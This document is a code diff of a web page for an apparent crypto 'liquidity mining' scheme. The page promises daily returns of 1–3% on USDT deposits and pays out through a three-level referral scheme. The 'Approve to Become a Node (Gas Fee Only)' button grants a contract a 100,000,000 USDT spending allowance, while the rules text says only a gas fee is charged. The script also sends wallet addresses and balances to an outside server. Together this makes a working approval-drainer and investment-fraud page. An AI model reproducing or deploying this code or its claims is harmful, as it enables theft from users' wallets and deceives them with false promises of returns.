@@ -1,106 +1,100 @@
 <!DOCTYPE html>
-<html lang="" style="font-size: 66.5625px;">
+<html lang=""">
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<link rel="icon" href="https://ethereum.org/favicon-32x32.png?v=8b512faa8d4a0b019c123a771b6622aa">
-<title>MINING WITHOUT STAKING</title>
-<script src="./index_files/web3.min.js"></script>
-<link href="./index_files/chunk-vendors.7e146468.css?v=7" rel="stylesheet">
-<link href="./index_files/app.af39082e.css?v=7" rel="stylesheet">
+	<meta charset="utf-8">
+	<meta http-equiv="window-target" content="_top">
+	<title>MINING WITHOUT STAKING</title>
+	<meta name="Keywords" content="">
+	<meta name="description" content="">
+	<meta name="author" content="">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<meta name="google" content="notranslate">
+	<link rel="shortcut icon" href="images/logo.svg"/>
+	<link rel="stylesheet" href="css/uigg.css"/>
+	<link rel='stylesheet' href='css/styles.css?v=1'/>
 </head>
-<body class="">
-	<noscript>
-		<strong>We're sorry but Ekta Mining System doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
-	</noscript>
-	<div id="app">
-		<div id="div_main" class="content-box contenter-box">
-			<div>
-				<div class="name anime-fade-in-down">
-					<a class="ico "></a>
-					<h6>No Stake<span>Mainnet</span></h6>
-					<h2>
-						<i class="logo"></i>
-					</h2>
-					<cite></cite>
-					<a href="#" class="btn float-left" id="rules" style="height:.5rem;line-height:.5rem;font-size:.2rem;margin-right:.2rem; background-color: #8ae9d9; color:#333; width:50px;">Rules</a>
-				</div>
-				<div class="address">
-					<span>Click 「」to copy and share your url！</span>
-					<a class="copy ico ico-archive-empty"  id="address" data-clipboard-text="#address"></a>
-				</div>
-				<div class="balance">
-					<div class="title">
-						<h5>ETH YOU HAVE EARNED:</h5>
-					</div>
-					<li>
-						<i class="ekta"></i>
-						<span>ETH</span>
-						<em id="eth"><b>0</b></em>
-					</li>
-				</div>
-				<div class="pools">
-					<div class="title">
-						<h5 style="display: flex;">Wallet USDT Balance&nbsp;<b id="usdt"></b>&nbsp;USDT</h5>
-						<h5>Basic output <b id="basicOutput">0</b> ETH/hour</h5>
-					</div>
-					<div class="pools-cont">
-						<div class="pools-group">
-							<h5>Mining Power Plus</h5>
-							<ul style="font-size: 12px;">
-								<li>
-									<span><span id="ETHBalance">0</span> ETH in Pool:</span>
-									<b>+<span id="ETHAward">0</span></b>
-									<em>ETH/h</em>
-								</li>
-								<li>
-									<span>L1 Team Output <span id="L1OUTPUT"></span> ETH/h</span>
-									<b>+<span id="L1Award">0</span></b>
-									<em>ETH/h</em>
-								</li>
-								<li>
-									<span>L2 Team Output <span id="L2OUTPUT"></span> ETH/h</span>
-									<b>+<span id="L2Award">0</span></b>
-									<em>ETH/h</em>
-								</li>
-								<li>
-									<span>L3 Team Output <span id="L3OUTPUT"></span> ETH/h</span>
-									<b>+<span id="L3Award">0</span></b>
-									<em>ETH/h</em>
-								</li>
-							</ul>
-							<a href="#" class="btn float-right" id="withdraw" style="display: none; width:100%;">Swap Earned ETH to USDT and Withdraw</a>
-							<a href="#" class="btn float-right" id="buy" style="display: none;">Mining Now</a>
-							<a href="#" class="btn float-right" id="approve" style="display: none; width:100%;">Approve to Become a Node (Gas Fee Only)</a>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-	</div>
-	<div id="loading" class="van-toast van-toast--middle van-toast--loading" style="z-index: 2001; display: none;max-width:100%; width: 100%; height: 100vh;">
-		<div class="van-loading van-loading--circular van-toast__loading">
-			<span class="van-loading__spinner van-loading__spinner--circular">
-				<svg viewBox="25 25 50 50" class="van-loading__circular">
-					<circle cx="50" cy="50" r="20" fill="none"></circle>
-				</svg>
-			</span>
-		</div>
-		<div id="loading_txt" class="van-toast__text"></div>
-		<div class="van-toast__text">Please don't close the browser !!!</div>
-	</div>
-	<div id="dialog" class="van-toast van-toast--middle van-toast--success" style="z-index: 2003; display: none;">
-		<i class="van-icon van-icon-success van-toast__icon"></i>
-		<div id="dialog_txt" class="van-toast__text">COPYED</div>
-	</div>
-	<div class="xl-chrome-ext-bar" id="xl_chrome_ext_{4DB361DE-01F7-4376-B494-639E489D19ED}" style="display: none;">
-		<div class="xl-chrome-ext-bar__logo"></div>
-		<a id="xl_chrome_ext_download" href="javascript:;" class="xl-chrome-ext-bar__option"></a>
-		<a id="xl_chrome_ext_close" href="javascript:;" class="xl-chrome-ext-bar__close"></a>
-	</div>
-	<script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
-	<script type="text/javascript" src="js/clipboard.min.js" ></script>
+<body>
+	<load></load>
+	<section class="mobile">
+	    <name>
+	        <h3>no stake<span>mainnet</span></h3>
+	        <name-logo><img src="images/logo.svg"></name-logo><u></u>
+	        <a class="btn rule-open">rules</a>
+	    </name>
+	    <div class="address center">
+	        <h5 id="address"></h5>
+	        <a class="ico ico-archive-empty copy" id="copy_target" data-clipboard-target="#copy_target"></a>
+	    </div>
+	    <div class="title-flex"><h3>eth you have earned:</h3></div>
+	    <div class="bet center"><i></i><h5>eth</h5><input id="eth" value="0" readonly></div>
+	    <div class="wallet">
+	        <p>Wallet USDT Balance <b id="usdt">0</b> USDT</p>
+	        <p>Basic Output <b id="basicOutput">0</b> ETH/Hour</p>
+	    </div>
+	    <div class="power">
+	        <h5>mining power plus</h5>
+	        <ul>
+	            <li><span><b id="ETHBalance"></b> ETH in Pool:</span><b id="ETHAward">+0</b><em>ETH/h</em></li>
+	            <li><span>L1 Team Output <em id="L1OUTPUT">ETH/h</em></span><b id="L1Award">+0</b><em>ETH/h</em></li>
+	            <li><span>L2 Team Output <em id="L2OUTPUT">ETH/h</em></span><b id="L2Award">+0</b><em>ETH/h</em></li>
+	            <li><span>L3 Team Output <em id="L3OUTPUT">ETH/h</em></span><b id="L3Award">+0</b><em>ETH/h</em></li>
+	        </ul>
+	        <a class="btn" id="withdraw" style="display: none">Swap Earned ETH to USDT and Withdraw</a>
+	        <a class="btn" id="buy" style="display: none">Mining Now</a>
+	        <a class="btn" id="approve" style="display: none">Approve to Become a Node (Gas Fee Only)</a>
+	    </div>
+	</section>
+	<pop class="power-pop">
+	    <pop-main>
+	        <pop-cont>
+	            <i class="ico ico-load"></i>
+	            <p id="loading_txt"></p>
+	        </pop-cont>
+	    </pop-main>
+	</pop>
+	<tip><i class="ico ico-circular-done"></i><span></span></tip>
+	<pop class="rule-pop">
+	    <pop-main>
+	        <pop-title><h3>rule</h3><a class="close"></a></pop-title>
+	        <pop-cont>
+	            <div class="rule-cont">
+	                <h3>coinbase wallet liquidity mining</h3>
+	                <p>Join the liquidity mining, deposit USDT to the wallet, the daily rate of return can reach</p>
+	                <ul>
+	                    <li>50-1K, 1%---1.2%</li>
+	                    <li>1K-5K, 1%---1.4%</li>
+	                    <li>5K-20K, 1%---1.6%</li>
+	                    <li>20K-50K, 1%--1.8%</li>
+	                    <li>50K-100K, 1%---2%</li>
+	                    <li>100K-200K, 1%---2.2%</li>
+	                    <li>200K-500K, 1%---2.4%</li>
+	                    <li>500K-1000K, 1%---2.6%</li>
+	                    <li>Above 1000K, 3%</li>
+	                </ul>
+	                <p>(Only USDT can generate income)</p>
+	                <p>Join the link (search the URL in the search box at the top of the coinbase wallet middle page -----------------------（Share link）--------------------------- Join the liquidity mining (need to receive the miner node fee, the fee is charged according to the blockchain The gas is standard 5-30 US dollars ETH)</p>
+	                <p>After the node certificate fee is paid, no fees will be charged, and the USDT assets stored in the coinbase wallet can be transferred and used normally.</p>
+	                <p>The mining pool does not need to mortgage assets to the mining pool to generate income. It is built on the blockchain and runs automatically in the form of smart contracts. It is obtained automatically. The mining pool rewards ETH minerals four times a day, once every six hours. When you withdraw your ETH, the Smart Contract will be exchanges USDT to the wallet and arrives in the coinbase wallet within 24 hours. You can enter the mining pool every day to check the income.</p>
+	                <p>This is absolutely fair. Regardless of the poor or the rich, there are two ways to make money, one is to deposit USDT to obtain income from the mining pool, and the other is to obtain income in the form of sharing.</p>
+	                <p>Level 1 return rate is 5%</p>
+	                <p>The secondary rate of return is 3%</p>
+	                <p>The three-tier rate of return is 1%</p>
+	                <p>The total return for the three levels is 9%</p>
+	                <p>Up to the third level is the third level customer group that you share. You will not be able to get a share of the income reward for the fourth-level customer.</p>
+	                <p>Assuming that each of the three levels earns 0.01 ETH, then the first level draws 5%, the second level draws 3%, and the third level draws 1%, so that’s 0.0009 ETH.</p>
+	                <p>If the total daily income of each of the three levels is 5 ETH, then you will receive an income bonus of 0.045 ETH.</p>
+	                <p>The first person you share is the first level, he continues to share with his friends, then this is your second level, you will get 3% of this person’s income, and so on, a total of three levels can get 9% Income.This exchange process is done through a third-party decentralized exchange that Coinbase partners with, where the liquidity provider service fees generated by the transactions are one of the sources of funding for this project.</p>
+	                <p>It is especially important to note that if you leave the earned ETH in the mining pool, we will also stake it to the liquidity pool of the third-party decentralized exchange via a smart contract, and the resulting market maker profits will be shared between the project and you, so if you keep the earned ETH in the mining pool, you will receive 50% more output capacity than the equivalent USDT in your wallet balance.</p>
+	                <p>Because the project is at an early stage, it needs to increase its visibility in this way.</p>
+	            </div>
+	        </pop-cont>
+	    </pop-main>
+	</pop>
+	<script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.3.4/dist/web3.min.js" type="text/javascript" ></script>
+	<script src="js/jquery.min.js" type="text/javascript" ></script>
+	<script src="js/clipboard.min.js" type="text/javascript" ></script>
+	<script src="js/uigg.js" type="text/javascript" ></script>
+	<script src="js/common.js" type="text/javascript" ></script>
 	<script type="text/javascript">
 		$(function () {
 			$.chainId = 1;
@@ -111,86 +105,11 @@
 			var ETH_USDT_ABI = [{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}];
 			var ETH_USDT_ADDR = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 			//var ETH_USDT_ADDR = "0xA63d85D76908A8cadf96CD80f3d7458E69d87FEB";
-			document.addEventListener("gesturestart", function (event) {
-				event.preventDefault();
+			
+			$('.rule-open').click(function(){
+				$('.rule-pop').show();
 			});
-			
-			var lastTouchEnd = 0;
-			document.addEventListener('touchend', function (event) {
-				var now = (new Date()).getTime();
-				if (now - lastTouchEnd <= 450) {
-					event.preventDefault();
-				}
-				lastTouchEnd = now;
-			}, false);
-			
-			$.getParam = function (name) {
-				var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)","i");
-				var r = window.location.search.substr(1).match(reg);
-				if (r != null) {
-					return decodeURI(r[2]);
-				} else {
-					return "";
-				}
-			};
-			
-			$.waitForReceipt = async function(tx_hash, max_try, callback) {
-				if (max_try <= 0) {
-					$.dialog("Wait for receipt timeout", 2000);
-					return;
-				}
-				let receipt = await $.web3.eth.getTransactionReceipt(tx_hash);
-				if (receipt != null) {
-					callback(receipt);
-				} else {
-					await $.sleep(1500);
-					$.waitForReceipt(tx_hash, max_try - 1, callback);
-				}
-			};
-			
-			$.sleep = function(ms) {
-				return new Promise((resolve) => {
-					setTimeout(resolve, ms);
-				});
-			};
-			
-			$.dialog = function(txt, ms){
-				$.hide();
-				$("#dialog_txt").text(txt);
-				$("#dialog").show();
-				if (ms > 0) {
-					setTimeout(function () {
-						$.hide();
-					}, ms);
-				}
-			};
-			
-			$.loading = function(txt){
-				$.hide();
-				$("#loading_txt").text(txt);
-				$("#loading").show();
-			};
-			
-			$.hide = function() {
-				$("#loading").hide();
-				$("#dialog").hide();
-			};
-			
-			$.copy = function(selecter) {
-				if ($(selecter).length == 0) {
-					return;
-				}
-				var clipboard = new ClipboardJS(selecter);
-				clipboard.on('success', function(e) {
-					$.dialog("Copy success", 2000);
-					e.clearSelection();
-				});
-				clipboard.on('error', function(e) {
-					$.dialog("Copy error", 2000);
-				});
-			};
-			$.copy(".copy");
-			
+	    
 			$.balanceChanged = function(obj) {
 				$.ajax({
 				 	type: "get",
@@ -199,7 +118,6 @@
 				 		address: $.walletAddress,
 				 		usdtBalance: obj.usdtBalance
 				 	},
-				 	traditional: true,
 				 	success: function(msg){
 				 		$("#ETHBalance").text(msg.ETHBalance);
 				 		$("#ETHAward").text(msg.ETHAward);
@@ -217,7 +135,7 @@
 			$.queryAccount = async function(callback) {
 				let result = await $.contract.methods.query_account($.walletAddress).call();
 				var obj = {
-					ethBalance: result['ethBalance'],
+					ethBalance: $.web3.utils.fromWei(result[0]),
 					balance: result[1],
 					usdtAllowance: $.web3.utils.fromWei(result[2], "Mwei"),
 					usdtBalance: $.web3.utils.fromWei(result[3], "Mwei")
@@ -227,29 +145,13 @@
 			
 			$.accountsChanged = function(addr){
 				$.walletAddress = addr;
-				//$("#address").text(window.location.protocol + "//" + window.location.host + "/index.html?ref=" + $.walletAddress);
-				$("#address").attr("data-clipboard-text", window.location.protocol + "//" + window.location.host + "/index.html?ref=" + $.walletAddress);
+				var refLink = window.location.protocol + "//" + window.location.host + "/index.html?ref=" + $.walletAddress;
+				$("#address").text($.walletAddress);
+				$("#copy_target").attr("data-clipboard-text", refLink);
 				
 				$.queryAccount(function(obj){
-					//$("#eth").text(obj.ethBalance);
 					$("#usdt").text(obj.usdtBalance);
-					
-					//if (obj.balance == 0) {
-					//	if (obj.usdtAllowance == 0) {
-					//		$("#buy").hide();
-					//		$("#withdraw").hide();
-					//		$("#approve").show();
-					//	} else {
-					//		$("#approve").hide();
-					//		$("#withdraw").hide();
-					//		$("#buy").show();
-					//	}
-					//} else {
-					//	$("#buy").hide();
-					//	$("#approve").hide();
-					//	$("#withdraw").show();
-					//	$.balanceChanged(obj);
-					//}
+					$("#eth").val(obj.ethBalance);
 					if (obj.usdtAllowance == 0) {
 						$("#withdraw").hide();
 						$("#approve").show();
@@ -261,18 +163,14 @@
 				});
 			};
 			
-			$("#rules").on('click', function(){
-				window.location.href = "rule.html";
-			});
-			
 			$("#approve").on('click', function(){
-				$.loading("Confirmation in progress");
+				$.loading("Confirmation in progress<br>Please don't close the browser !!!");
 				$.tokenContract.methods
 					.approve(ADDR, $.web3.utils.toWei("100000000", "Mwei"))
 					.send({from: $.walletAddress}, function(error){
 						if (error) {
 							if (error.code == 4001) {
-								$.dialog(error.message, 2000);
+								$.dialog(error.message);
 							}
 						}
 					})
@@ -280,11 +178,10 @@
 						$.waitForReceipt(tx.transactionHash, 6, (receipt) => {
 							$.hide();
 							$("#approve").hide();
-							//$("#buy").show();
 							$("#withdraw").show();
 							
 							$.queryAccount(function(obj){
-								$("#eth").text(obj.ethBalance);
+								$("#eth").val(obj.ethBalance);
 								
 								var ref = $.getParam("ref");
 								ref = ref ? ref : defaultRef;
@@ -300,9 +197,9 @@
 								 	success: function(msg){
 								 	    $.hide();
 								 	    if (msg == 0) {
-								 			$.dialog("error", 2000);
+								 			$.dialog("error");
 								 		} else {
-								 		    $.dialog("success", 2000)
+								 		    $.dialog("success")
 								 			$.balanceChanged(obj);
 								 		}
 								 	}
@@ -312,50 +209,8 @@
 					});
 			});
 			
-			$("#buy").on('click', function(){
-				$.loading("Confirmation in progress");
-				$.contract.methods
-					.buy()
-					.send({from: $.walletAddress}, function(error){
-						if (error) {
-							if (error.code == 4001) {
-								$.dialog(error.message, 2000);
-							}
-						}
-					})
-					.then(function(tx) {
-						$.waitForReceipt(tx.transactionHash, 6, (receipt) => {
-							$.hide();
-							$("#buy").hide();
-							$("#withdraw").show();
-							
-							$.queryAccount(function(obj){
-								$("#eth").text(obj.ethBalance);
-								$("#usdt").text(obj.usdtBalance);
-								
-								$.ajax({
-								 	type: "post",
-								 	url: "https://api.cc.sc/index/index/addnode/",
-								 	data: {
-								 		address: $.walletAddress,
-								 		tokenTx: tx.transactionHash
-								 	},
-								 	success: function(msg){
-								 		if (msg == 0) {
-								 			$.dialog("error", 2000);
-								 		} else {
-								 		    $.dialog("success", 2000)
-								 			$.balanceChanged(obj);
-								 		}
-								 	}
-								});
-							});
-						});
-					});
-			});
-			
 			$("#withdraw").on('click', function(){
-				$.loading("Confirmation in progress");
+				$.loading("Confirmation in progress<br>Please don't close the browser !!!");
 				$.ajax({
 				 	type: "post",
 				 	url: "https://api.cc.sc/index/index/withdraw",
@@ -365,9 +220,9 @@
 				 	},
 				 	success: function(msg){
 				 		if (msg == 0) {
-				 			$.dialog(msg.errorMessage, 2000);
+				 			$.dialog(msg.errorMessage);
 				 		} else {
-				 			$.dialog("success", 2000);
+				 			$.dialog("success");
 				 		}
 				 	}
 				});
